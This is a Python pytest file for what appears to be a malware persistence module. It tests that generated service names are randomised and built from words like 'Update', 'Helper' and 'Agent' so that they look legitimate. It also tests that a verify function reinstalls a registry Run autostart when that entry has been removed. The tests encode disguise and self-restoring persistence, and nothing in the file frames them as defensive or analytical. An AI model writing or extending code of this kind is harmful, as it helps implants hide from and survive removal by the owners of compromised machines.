import pytest
from unittest.mock import patch, MagicMock

def test_random_name_is_different_each_time():
    from persistence import _random_service_name
    names = {_random_service_name() for _ in range(20)}
    assert len(names) > 5  # not always the same

def test_random_name_looks_legitimate():
    from persistence import _random_service_name
    name = _random_service_name()
    assert any(word in name for word in [
        "Update", "Sync", "Service", "Helper", "Host", "Agent", "Manager"
    ])

def test_verify_reinstalls_if_absent():
    from persistence import verify
    with patch("persistence.check_persistence", return_value={"registry_run": False}), \
         patch("persistence.install_with_fallback", return_value=(True, "ok")) as mock_install:
        verify()
        mock_install.assert_called()
